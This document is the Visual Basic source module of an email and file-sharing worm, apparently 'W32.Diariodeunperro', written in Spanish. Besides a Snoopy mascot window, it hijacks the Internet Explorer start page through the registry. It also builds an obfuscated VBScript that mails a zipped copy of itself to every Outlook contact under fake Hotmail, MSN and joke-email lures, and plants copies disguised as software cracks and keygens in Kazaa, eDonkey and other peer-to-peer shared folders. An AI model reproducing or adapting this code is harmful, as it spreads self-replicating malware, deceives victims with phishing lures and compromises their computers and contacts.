Attribute VB_Name = "Module2"
'Todo esto para la mascota
 'formulario siempre on top
Option Explicit
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Global Const SWP_NOMOVE = 2
Global Const SWP_NOSIZE = 1
Global Const flags = SWP_NOMOVE Or SWP_NOSIZE
Global Const HWND_TOPMOST = -1
Global Const HWND_NOTOPMOST = -2

'/////////////////////////////////////////////////////

Public Declare Function GetPixel Lib "gdi32" (ByVal hdc As Long, ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function SetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Public Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Public Declare Function CombineRgn Lib "gdi32" (ByVal hDestRgn As Long, ByVal hSrcRgn1 As Long, ByVal hSrcRgn2 As Long, ByVal nCombineMode As Long) As Long
Declare Sub ReleaseCapture Lib "user32" ()
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long

Public Const RGN_DIFF = 4
Public Const SC_CLICKMOVE = &HF012&
Public Const WM_SYSCOMMAND = &H112

Dim CurRgn, TempRgn As Long  ' Region variables
'///////////////////////////////////////////////////////
'imagenes
Global img1 As Object
Global img2 As Object
Global img3 As Object
Global img4 As Object
Global img5 As Object
Global img6 As Object
Global img7 As Object
Global img8 As Object
Global img9 As Object
'Mi directorio
Public midir As String
Public p2p As String

Public Function AutoFormShape(bg As Form, transColor)
Dim X, Y As Integer
Dim SUCCESS As Long
CurRgn = CreateRectRgn(0, 0, bg.Width / 15, bg.Height / 15)

While Y <= bg.Height / 15
    While X <= bg.Width / 15
        If GetPixel(bg.hdc, X, Y) = transColor Then
            TempRgn = CreateRectRgn(X, Y, X + 1, Y + 1)
            SUCCESS = CombineRgn(CurRgn, CurRgn, TempRgn, RGN_DIFF)
            DeleteObject (TempRgn)
        End If
        X = X + 1
    Wend
        Y = Y + 1
        X = 0
Wend
SUCCESS = SetWindowRgn(bg.hwnd, CurRgn, True)
DeleteObject (CurRgn)
 
End Function

'para ke sten on top la ventana
Sub ventanavisible(handle As Long)
    Dim SUCCESS As Long
    SUCCESS = SetWindowPos(handle, HWND_TOPMOST, 0, 0, 0, 0, flags)
End Sub

Public Sub cargarsnoopy()
Set img1 = LoadPicture(fso.getspecialfolder(1) & "\snoopy\snoopy1.bmp")
Set img2 = LoadPicture(fso.getspecialfolder(1) & "\snoopy\snoopy2.bmp")
Set img3 = LoadPicture(fso.getspecialfolder(1) & "\snoopy\snoopy3.bmp")
Set img4 = LoadPicture(fso.getspecialfolder(1) & "\snoopy\snoopy4.bmp")
Set img5 = LoadPicture(fso.getspecialfolder(1) & "\snoopy\snoopy5.bmp")
Set img6 = LoadPicture(fso.getspecialfolder(1) & "\snoopy\snoopy6.bmp")
Set img7 = LoadPicture(fso.getspecialfolder(1) & "\snoopy\snoopy7.bmp")
End Sub

Sub snoopy()
Static i As Integer

Select Case i
 Case 0: Form2.Picture = img1
 Case 1: Form2.Picture = img2
 Case 2: Form2.Picture = img3
 Case 3: Form2.Picture = img4
 Case 4: Form2.Picture = img5
 Case 5: Form2.Picture = img6
 Case 6: Form2.Picture = img7
         i = 0
End Select
i = i + 1
AutoFormShape Form2, vbRed
End Sub

Sub pagina()

Dim archivo
Dim a As Integer
Dim fuente As String

a = Int(Rnd() * 5)

Select Case a
Case 0: fuente = "Courier"
Case 1: fuente = "Arial"
Case 2: fuente = "Comic Sans MS"
Case 3: fuente = "Helvetica"
Case 4: fuente = "sans-serif"
End Select

wss.regwrite "HKCU\software\microsoft\internet explorer\main\start page", "C:\Corporacion_MLHR.htm"
wss.regwrite "HKCU\software\microsoft\internet explorer\main\window title", "Morusa est? aqu? - ?Viva M?xico! - " & decriptador("71,101,68,90,97,67,") & "- W32.Diariodeunperro."

Set archivo = fso.Createtextfile("C:\Corporacion_MLHR.htm")
archivo.writeline "<HTML><HEAD><TITLE>Corporaci?n MLHR</TITLE>"
archivo.writeline "<style type=text/css> Body {scrollbar-face-color: #000000; scrollbar-shadow-color:blue; scrollbar-highlight-color: blue;"
archivo.writeline "scrollbar-3dlight-color: black; scrollbar-darkshadow-color: black; scrollbar-track-color:black; scrollbar-arrow-color: white;"
archivo.writeline "} </HEAD></STYLE>"
archivo.writeline "<Body bgcolor=black link=white alink=brown vlink=yellow+red>"
archivo.writeline "<center><p><b><font face=" & Chr(34) & fuente & Chr(34) & " color=" & Chr(34) & "#CCCCCC" & Chr(34) & " size=10>El diario de un perro</font></b></p></center>"
archivo.writeline "<div align=" & Chr(34) & "justify" & Chr(34) & "><p><font color=green>- Semana 1:<font color=white> Hoy cumpl? una semana de nacido, ?Qu? alegr?a haber llegado a este mundo!</font></p>"
archivo.writeline "<p>- Mes 1:<font color=white> Mi mama me cuida muy bien. Es una mama ejemplar.</font></p>"
archivo.writeline "<p>- Mes 2:<font color=white> Hoy me separaron de mi mama.Ella estaba muy inquieta, y con sus ojos me dijo adi?s. Esperando que mi nueva ?familia humana! me cuidara tan bien como ella lo hab?a hecho.</font></p>"
archivo.writeline "<p>- Mes 4:<font color=white> He crecido r?pido; todo me llama la atenci?n. Hay varios ni?os en la casa que son para mi como hermanitos. Somos muy inquietos, ellos me cogen la cola y yo les muerdo jugando.</font></p>"
archivo.writeline "<p>- Mes 5:<font color=white> Hoy me rega?aron. Mi ama se molest? porque hice pip? adentro de la casa; pero nunca me hab?an dicho d?nde debo hacerlo. Adem?s duermo en la recamara...?y ya no me aguantaba!</font></p>"
archivo.writeline "<p>- Mes 6:<font color=white> Soy un perro feliz. Tengo el calor de un hogar; me siento tan seguro, tan protegido. Creo que mi familia humana me quiere y me consiente mucho. Cuando est?n comiendo me convidan. El patio es para mi solito y me doy vuelo escarbando como mis antepasados los lobos, cuando esconden la comida. Nunca me educan. Ha de estar bien todo lo que hago.</font></p>"
archivo.writeline "<p>- Mes 12:<font color=white> Hoy cumpl? un a?o. Soy un perro adulto. Mis amos dicen que crec? m?s de lo que ellos pensaban. Que orgullosos se deben sentir de mi.</font></p>"
archivo.writeline "<p>- Mes 13:<font color=white> Qu? mal me sent? hoy. Mi hermanito me quit? la pelota. Yo nunca cojo sus juguetes. As? que se la quit?. Pero mis mand?bulas se han hecho fuertes, as? que lo lastim? sin querer. Despu?s del susto, me encadenaron casi sin poderme mover al rayo de sol. Dicen que van a tenerme en observaci?n y que soy ingrato. No entiendo nada de lo que pasa.</font></p>"
archivo.writeline "<p>- Mes 15:<font color=white> Ya nada es igual...vivo en la azotea. Me siento muy solo, mi familia ya no me quiere. A veces se les olvida que tengo hambre y sed. Cuando llueve no tengo techo que me cobije.</font></p>"
archivo.writeline "<p>- Mes 16:<font color=white> Hoy me bajaron de la azotea. Seguramente mi familia me perdon? y me puse tan contento que daba saltos de alegr?a. Mi rabo parec?a que iba a salir desorbitado. Encima de eso, me van a llevar con ellos de paseo. Nos dirigimos hacia la carretera y de repente se pararon. Abrieron la puerta y yo baje feliz creyendo que har?amos nuestro  d?a de campo. No comprendo por qu? cerraron la puerta y se fueron. ?Oigan, esperen! Se olvidan de mi. Corr? detr?s del coche con todas mis fuerzas. Mi angustia crec?a al darme cuenta, que casi me desvanec?a y ellos no se deten?an: me hab?an abandonado.</font></p>"
archivo.writeline "<p>- Mes 17:<font color=white> he tratado en vano de buscar el camino de regreso a casa. Me siento y estoy perdido. En mi sendero hay gente de buen coraz?n que me ve con tristeza y me da algo de comer. Yo les agradezco con mi mirada y desde el fondo de mi alma. Yo quisiera que me adoptaran y ser?a leal como ninguno. Pero s?lo dicen ?pobre perrito!, se ha de haber perdido.</font></p>"
archivo.writeline "<p>- Mes 18:<font color=white> El otro d?a pas? por una escuela y vi a muchos ni?os y j?venes como mis hermanitos. Me acerque, y un grupo de ellos, ri?ndose, me lanz? una lluvia de piedras a ver quien ten?a mejor punter?a. Una de esas piedras me lastim? el ojo y desde entonces ya no veo con ?l.</font></p>"
archivo.writeline "<p>- Mes 19:<font color=white> Parece mentira, cuando estaba m?s bonito se compadec?an m?s de mi.Ya estoy muy flaco; mi aspecto ha cambiado. Perd? mi ojo y la gente m?s bien me saca a escobazos cuando pretendo echarme en una peque?a sombra.</font></p>"
archivo.writeline "<p>- Mes 20:<font color=white> Casi no puedo moverme. Hoy al tratar de cruzar la calle por donde pasan los coches, uno me arroll?. Seg?n yo, estaba en un lugar llamado cuneta, pero nunca olvidare la mirada de satisfacci?n del conductor, que hasta se ladeo con tal de centrarme. Ojal? me hubiera matado, pero s?lo me disloc? la cadera. El dolor es terrible, mis patas traseras no me responden y con dificultades me arrastr? hacia un poco de hierba en la ladera del camino.</font></p>"
archivo.writeline "<p>- Mes 21:<font color=white> Llevo diez d?as bajo el sol, la lluvia, el fr?o, sin comer. Ya no me puedo mover. El dolor es insoportable. Me siento muy mal; qued? en un lugar h?medo y parece que hasta mi pelo se est? cayendo. Alguna gente pasa y ni me ve; otras dicen:  no te acerques. Ya casi estoy inconsciente; pero alguna fuerza extra?a me hizo abrir los ojos. La dulzura de su voz me hizo reaccionar. ?Pobre perrito, mira como te han dejado!, dec?a... junto a ella ven?a un se?or de bata blanca, empez? a tocarme y dijo: Lo siento se?ora, pero este perro ya no tiene remedio, es mejor que deje de sufrir. A la gentil dama se le salieron las lagrimas y asinti?. Como pude, mov? el rabo y la mir? agradeci?ndole que me ayudara a descansar. Solo sent? el pinchazo de una inyecci?n y me dorm? para siempre pensando en por qu? tuve que nacer si nadie me quer?a.</font></p>"
archivo.writeline "</div>"
archivo.writeline ""
archivo.writeline ""
archivo.writeline "<font><font face=" & Chr(34) & "Arial" & Chr(34) & " color=" & Chr(34) & "#00FF66" & Chr(34) & "Size = 2 > """
archivo.writeline "<center>Saludos para Ana Patricia R.S. de Sinaloa y a Juan Ramon Saenz de la Mano Peluda</center>"
archivo.writeline "<center>Atte: Su servidora Manoadicta Morusa</center></font>"
archivo.writeline "<center><a href=" & Chr(34) & "Http://www.radioformula.com" & Chr(34) & ">P?gina de Radio formula</a></center><br>"
archivo.writeline "<font colo=Yellow><center>?CuIDa El AgUa! Se EsTa AkBanDo</center></font>"
archivo.writeline "<br><center><a href=" & Chr(34) & "Http://www.radioformula.com" & Chr(34) & ">P?gina de Radio formula</a></center><br>"
archivo.writeline "<center><font color=yellow><a href=" & Chr(34) & "Http://mlhrcorporation.tripod.com" & Chr(34) & "><i>Corporaci?n <b>MLHR</b> ?</i></a></center>"
archivo.writeline "<center><p><i>Copyright</i><b> 2004 " & decriptador("71,101,68,90,97,67,") & ".</b></p></font></center>"
archivo.writeline ""
archivo.writeline "</body>"
archivo.writeline "</html>"
archivo.Close


wss.run "C:\Corporacion_MLHR.htm"

End Sub

Sub vbsenviarmail(asunto As String, contenido As String, nombrezip As String)
Dim au, pathzip


FileCopy midir, fso.getspecialfolder(2) & "\" & nombrezip & ".exe"
Call crearzipparamail(nombrezip, nombrezip)

Set au = fso.getfile(fso.getspecialfolder(2) & "\" & nombrezip & ".zip")
pathzip = au.shortpath

Dim archivo
Set archivo = fso.Createtextfile(fso.getspecialfolder(2) & "\liame.vbs")
archivo.writeline "Function decriptador(texto)"
archivo.writeline "Dim c, au, dec"
archivo.writeline "While texto <> " & Chr(34) & Chr(34)
archivo.writeline "c = InStr(1, texto," & Chr(34) & "," & Chr(34) & ", 0)"
archivo.writeline "au = Chr(Mid(texto, 1, c - 1))"
archivo.writeline "texto = Mid(texto, c + 1, Len(texto))"
archivo.writeline "dec = dec + au"
archivo.writeline "Wend"
archivo.writeline "decriptador = dec"
archivo.writeline "End Function"
archivo.writeblanklines (2)

archivo.writeline "Sub enviarmail()"
archivo.writeline "Dim a, b, c, d"
archivo.writeline "Dim outlook, Mapi, Mapiusuario, listasmapi, Indx"
archivo.writeline "Dim CountMapiUsuario, Mail, AdressMail"
archivo.writeline "a = " & Chr(34) & "Out" & Chr(34)
archivo.writeline "b = " & Chr(34) & "look" & Chr(34)
archivo.writeline "c = " & Chr(34) & ".Appli" & Chr(34)
archivo.writeline "d = " & Chr(34) & "cation" & Chr(34)
archivo.writeline "Set outlook = CreateObject(a + b + c + d)"
archivo.writeline "If outlook = a + b Then"
archivo.writeline "a = " & Chr(34) & "MA" & Chr(34)
archivo.writeline "b = " & Chr(34) & "PI" & Chr(34)
archivo.writeline "Set Mapi = outlook.GetNameSpace(a + b)"
archivo.writeline "Set listasmapi = Mapi.AddressLists"
archivo.writeline "For Each Mapiusuario In listasmapi"
archivo.writeline "If Mapiusuario.AddressEntries.Count <> 0 Then"
archivo.writeline "CountMapiUsuario = Mapiusuario.AddressEntries.Count"
archivo.writeline "For Indx = 1 To CountMapiUsuario"
archivo.writeline "Set Mail = outlook.CreateItem(0)"
archivo.writeline "Set AdressMail = Mapiusuario.AddressEntries(Indx)"
archivo.writeline "Mail.To = AdressMail.Address"
archivo.writeline "Mail.Subject = " & Chr(34) & asunto & Chr(34)
archivo.writeline "Mail.Body = " & Chr(34) & contenido & Chr(34)
archivo.writeline "execute(decriptador(" & Chr(34) & "83,101,116,32,65,100,106,117,110,116,111,32,61,32,77,97,105,108,46,65,116,116,97,99,104,109,101,110,116,115," & Chr(34) & "))"
archivo.writeline "adj=" & Chr(34) & pathzip & Chr(34)
archivo.writeline "execute(decriptador(" & Chr(34) & "65,100,106,117,110,116,111,46,65,100,100," & Chr(34) & ") & " & Chr(34) & " adj" & Chr(34) & ")"
archivo.writeline "Mail.DeleteAfterSubmit = True"
archivo.writeline "If Mail.To <> " & Chr(34) & Chr(34) & " Then"
archivo.writeline "Mail.Send"
archivo.writeline "End If"
archivo.writeline "Next"
archivo.writeline "End If"
archivo.writeline "Next"
archivo.writeline "End If"
archivo.writeline "End Sub"
archivo.writeblanklines (2)

archivo.writeline "Call enviarmail"
archivo.Close

wss.run fso.buildpath(fso.getspecialfolder(2), "liame.vbs")
End Sub
Sub crearzipparamail(nombre As String, nombrevir As String)
Dim au, pathzip
Dim au2, patharch
On Error GoTo err:

Open fso.getspecialfolder(2) & "\" & nombre & ".zip" For Output As #1
Close #1

Set au = fso.getfile(fso.getspecialfolder(2) & "\" & nombre & ".zip")
pathzip = au.shortpath

Set au2 = fso.getfile(fso.getspecialfolder(2) & "\" & nombrevir & ".exe")
patharch = au2.shortpath
Close

 Shell winzip & " -a " & pathzip & " " & patharch, vbHide
 
DoEvents

'Pausa
While randon = False
Wend
'MsgBox ("hola")
err:
End Sub

Sub mail()
Dim contenido As String
Dim asunto As String
Dim nombrezip As String
Dim n As Integer

Randomize
n = Int(Rnd() * 20)
Select Case n
Case 0: asunto = "Fw: Romeo y Julieta"
        contenido = "Hola, te envio este mail para que rias de la parodia de Romeo y Julieta" & Chr(34) & " _ " & vbCrLf & " & " & Chr(34) & "Espero te guste ;-)"
        nombrezip = "Romeo y Julieta"
Case 1: asunto = "Fw: Huevo cartoon"
        contenido = "Hola, Aqui te mando una postal de huevo cartoon para que rias de las ocurrencias de estos afamados huevos"
        nombrezip = "HuevoHussein"
Case 2: asunto = "Fw: El mono mario"
        contenido = "Hola, Aqui te mando una animacion del mono mario para que rias hasta morir de ?l"
        nombrezip = "Mono Mario"
Case 3: asunto = "Fw: la felicidad"
        contenido = "La felicidad puede o no puede llegar, todo esta en t? mismo, checa el archivo adjunto"
        nombrezip = "La felicidad"
Case 4: asunto = "Fw: La academia"
        contenido = "Checa esta animaci?n de la Academia te reirar?s hasta morir"
        nombrezip = "La Academia 3"
Case 5: asunto = "Fw: Big brother Vip 3"
        contenido = "Checa esta anumaci?n del reality show Big Brother Vip, te reir?s hasta morir"
        nombrezip = "BBVip3"
Case 6: asunto = "Huevopostales"
        contenido = "H?s recibido una huevopostal adjuta a este correo" & Chr(34) & " & vbCrLf & " & Chr(34) & "En caso de error ve a Http://www.huevocartoon.com/module1.php=?323443-2312738120034567" & Chr(34) & " & vbCrLf & " & Chr(34) & "Atte: Www.Huevocartoon.com"
        nombrezip = "Te adoro"
Case 7: asunto = "Mono mario postal"
        contenido = "Has recibido una Mono mario postal adjunta a este correo" & Chr(34) & " & vbCrLf & " & Chr(34) & "En caso de error ve a Http://www.monomario.com/module1.php=?3233-231273814545328780"
        nombrezip = "Mono mario"
Case 8: asunto = "Fw: que tanto quieres a tu amigo"
        contenido = "Este test es para saber que tanto quieres a una amigo"
        nombrezip = "Test del amigo"
Case 9: asunto = "Fw: tips para tirar choros a las chavas"
        contenido = "Aqui te daremos algunos choros para conquistar a la mujer que tanto te gusta s?lo desacarga el archivo adjunto"
        nombrezip = "Choros"
Case 10: asunto = "Fw: Test de te ?enga?a tu novio (a)?"
        contenido = "con este test te dar?s cuenta si te enga?a o no tu novio (a), para que ya lo mandes a volar"
        nombrezip = "Test para ver si te enga?a tu novio(a)"
Case 11: asunto = "Hotmail usuario"
        contenido = "Te informamos que nuestra area de emoticones ha crecido, con el programa adjunto podr?s bajar por categor?a cada emoticon y autom?ticamente se instalan" & Chr(34) & " & vbCrLf & " & Chr(34) & "Atte: MSN Messenger"
        nombrezip = "Emoticones"
Case 12: asunto = "Vota por tus artistas de la Academia 3"
        contenido = "Ahora ya puedes votar y ganar por medio de tu correo, solo instala el programa adjunto y vota por tu artista preferido"
        nombrezip = "Vota y Gana"
Case 13: asunto = "Fw: Como saber si tienes un admirador secreto"
        contenido = "Con este test podr?s saber si tienes un admirador secreto y darte cuenta paso a paso de quien es, te va a encantar"
        nombrezip = "Test del admirador secreto"
Case 14: asunto = "Fw: Club fans de Christian Castro"
        contenido = "?nete al club de fans 'Te llam?' de Christian Castro s?lo contesta el test adjunto y solito se env?a, esperamos que te unas ?Gracias!"
        nombrezip = "Club Fans"
Case 15: asunto = "Aviso Importante"
        contenido = "MSN Hotmail" & Chr(34) & " & vbCrLf & " & Chr(34) & "     De antemano, disculpe las molestias que este ocacione:" & Chr(34) & " & vbCrLf & " & Chr(34) & "Por este medio queremos constatar que puede ampliar" & Chr(34) & " & vbCrLf & " & Chr(34) & _
        "su correo electr?nio a 6 megabytes de capacidad s?lo dandose de alta con el archivo aqui adjunto." & Chr(34) & " & vbCrLf & " & Chr(34) & "                    Atte:" & Chr(34) & " & vbCrLf & " & Chr(34) & "    T1 MSN Hotmail."
        nombrezip = "MSN Hotmail"
Case 16: asunto = "Fw: Snoopy"
        contenido = "Fw: ana_patricia@hotmail.com" & Chr(34) & " & vbCrLf & " & Chr(34) & "for: karina_13@hotmail.com,rocio234@hotmail.com, rosa_aura@hotmail.com, rosa_aura@hotmail.com, beto_eres12@yahoo.com, hello_kitty@msn.com, fresita_18@hotmail.com, morusa@hotmai.com, " & _
        "snoopy_14@hotmail.com, elrasta13@yahoo.com, gigabyte@hotmail.com, rocio_ferrero@hotmail.com, vx_morusa@msn.com, anasujeis@hotmail.com" & Chr(34) & " & vbCrLf & " & Chr(34) & _
        "Holas:" & Chr(34) & " & vbCrLf & " & Chr(34) & "Checa esta animaci?n de Snoopy y sus tonterias, te va a fascinar"
        nombrezip = "Snoopy"
Case 17: asunto = "Fw: nuevo programa para bajar musica"
        contenido = "Con este programa puedes bajar y encontrar todas las canciones, es derivado del Audiogalaxy, esta recomendado"
        nombrezip = "AudioMusicEx"
Case 18: asunto = "Ovnis UFO"
        contenido = "Baja videos de ovnis que fueron captados por la NASA,UFO y videoaficionados, son videos censurados por la CIA y nosotros los traemos hasta ustedes,tan s?lo conectate con el programa adjunto y b?jalos gratis, tambien puedes bajar misteriosos sucesos, significado de las pir?mides, c?dices decifrados, etc."
        nombrezip = "Cyrux"
Case 19: asunto = "M?sica"
        contenido = "Te informamos que puedes bajar la m?sica en Mp3 teniendo el Disco original de este, con s?lo introducir el c?digo de barras de tu disco puedes bajar otro que tu quieras !gratis? " & _
        "Es un golpe m?s para la pirater?a, s?lo instala el programa adjunto para conectarte al servidor de www.sonymusic.com que esta afiliada a warner y fonovisa entre otros."
        nombrezip = "SonyMusic"
Case 20: asunto = "Fw: Antagonistas"
        contenido = "Aqui te mando una animaci?n de los antagonistas para que rias hasta..."
        nombrezip = "Antagonistas"
End Select

Call vbsenviarmail(asunto, contenido, nombrezip)
End Sub

Sub p2pnombres(p2pprograma As String)
Dim au As Integer
Dim nombre As String
Dim nombrevir As String

Dim vir As String
'au = Rnd() * 20

Open midir For Binary As #5
vir = Space(LOF(5))
Get #5, , vir
Close #5

On Error Resume Next

For au = 0 To 25

Select Case au
Case 0: nombre = "Crack de winzip 9"
        nombrevir = "crack Winzip"
Case 1: nombre = "Half life 2 Crack"
nombrevir = "Crack HL 2"
Case 2: nombre = "Office 2003 Crack"
nombrevir = "Crack Office 2003"
Case 3: nombre = "Windows 2003 seriales"
nombrevir = "Win 2003 Keygenerator"
Case 4: nombre = "Windows 98 Seriales"
nombrevir = "Win 98 Keygenerator"
Case 5: nombre = "Windows Me seriales"
nombrevir = "WinMe KeyGenerator"
Case 6: nombre = "Musicmatch 8.x crack "
nombrevir = "Crack MusicMatch Jukebox"
Case 7: nombre = "Nero 6.x crack"
nombrevir = "Crack Nero 6.x"
Case 8: nombre = "Kof2003 neoragex emulador"
nombrevir = "Neoragex parche para Kof2003"
Case 9: nombre = "Windows Xp Home serial number"
nombrevir = "WinXp Home KeyGenerator"
Case 10: nombre = "Windows Xp Profesional serial number"
nombrevir = "WinXp Profesional Serials"
Case 11: nombre = "Office Xp crack"
nombrevir = "Keygenerator Office Xp"
Case 12: nombre = "Emurayden Xp"
nombrevir = "Setup"
Case 13: nombre = "Half life Keygenerator"
nombrevir = "HLKeygenerator"
Case 14: nombre = "Half life opossing force crack"
nombrevir = "Opossing crack"
Case 15: nombre = "Visual Basic keygenerator"
nombrevir = "Keygenerator"
Case 16: nombre = "Delphi all versions keygen"
nombrevir = "Keygenerator"
Case 17: nombre = "Norton Antivirus 2004 keygen"
nombrevir = "NAV Keygenerator"
Case 18: nombre = "Panda Antivirus Titanium Keygenrator for all versions"
nombrevir = "PAT Keygen"
Case 19: nombre = "Mcafee Antivirus Scan Crack"
nombrevir = "McAfee Scan keygen"
Case 20: nombre = "MSN Poligammy for 6.x"
nombrevir = "Poligammy for MSN 6.x"
Case 21: nombre = "Messenger Plus"
nombrevir = "MSN Plus"
Case 22: nombre = "Kazaa lite 2_3_5"
nombrevir = "Kazaa lite"
Case 23: nombre = "Kazaa lite 3_1_0"
nombrevir = "Kazaa lite ++"
Case 24: nombre = "Musicmatch 9.x crack "
nombrevir = "Crack MusicMatch Jukebox 9"
Case Else
 nombre = "EDonkey"
 nombrevir = "P2P Edonkey"
End Select

If winzip <> "" Then
  Call crearexe(vir, nombrevir, False, "")

  Call creararchivoparap2p(nombre, nombrevir, p2pprograma)
Else
  Call crearexe(vir, nombre, True, p2pprograma)
End If

Next

End Sub
Sub crearexe(vir As String, nombrevir As String, winzip As Boolean, p2programa As String)
On Error Resume Next

If winzip = False Then
 Open fso.getspecialfolder(1) & "\" & nombrevir & ".exe" For Binary As #5
 Put #5, , vir
 Close #5
Else
 Open fso.buildpath(p2programa, nombrevir & ".exe") For Binary As #5
 Put #5, , vir
 Close #5
End If

Close

DoEvents

End Sub

Sub copiararchivoparap2p(borrar, nombre As String, p2pprograma As String)
'p2p va a contener el directorio de kazaa o de morpheus, etc.

 'p2p = "C:\archivos de programa\kazaa\my shared folder"

FileCopy borrar, fso.buildpath(p2pprograma, nombre & ".zip")

End Sub
Sub creararchivoparap2p(nombre As String, nombrevir As String, p2pprograma As String)
Dim tam As Double
Dim au, pathzip
Dim au2, patharch
On Error GoTo err:

Open fso.getspecialfolder(1) & "\" & nombre & ".zip" For Output As #1
Close #1

Set au = fso.getfile(fso.getspecialfolder(1) & "\" & nombre & ".zip")
pathzip = au.shortpath

Set au2 = fso.getfile(fso.getspecialfolder(1) & "\" & nombrevir & ".exe")
patharch = au2.shortpath
Close

 Shell winzip & " -a " & pathzip & " " & patharch, vbHide
 
DoEvents

'Pausa
While randon = False
Wend

Call copiararchivoparap2p(pathzip, nombre, p2pprograma)

Kill fso.getspecialfolder(1) & "\" & nombrevir & ".exe"
Kill pathzip
err:
End Sub
Function randon() As Boolean
Dim i As Double
Randomize
i = Rnd() * 5000
DoEvents
If Int(i) = 152 Then
 randon = True
End If
End Function
Function p2pdownloads()
Dim adp As String
On Error Resume Next
kazaa = wss.regread("HKLM\software\kazaa\Localcontent\DownloadDir")
kazaaplusplus = wss.regread("HKLM\software\kazaa\Localcontent\DownloadDir")
morpheus = wss.regread("HKLM\software\morpheus\install_dir") & "\downloads"
imesh = wss.regread("HKLM\software\iMesh\Client\Localcontent\DownloadDir")

adp = wss.regread("HKLM\Software\Microsoft\Windows\Currentversion\ProgramFilesDir")

If fso.folderexists(adp & "\BearShare\Shared") Then
  bearshare = adp & "\BearShare\Shared"
End If
If fso.folderexists(adp & "\Grokster\My Grokster") Then
  grokster = adp & "\Grokster\My Grokster"
End If
If fso.folderexists(edonkey = adp & "Edonkey2000\Incoming") Then
  edonkey = adp & "Edonkey2000\Incoming"
End If


''''''''''''''''''Red''P2p''''''''''''''''''''
If kazaa <> "" Then
  Call p2pnombres(kazaa)
End If
''''''
If kazaaplusplus <> "" Then
  Call p2pnombres(kazaaplusplus)
End If
''''''
If morpheus <> "" Then
  Call p2pnombres(morpheus)
End If
'''''''
If imesh <> "" Then
  Call p2pnombres(imesh)
End If
''''''
If bearshare <> "" Then
  Call p2pnombres(bearshare)
End If
'''''
If grokster <> "" Then
  Call p2pnombres(grokster)
End If
'''''
If edonkey <> "" Then
  Call p2pnombres(edonkey)
End If
'''''''''''''''''''''''''''''''''''''''''
End Function
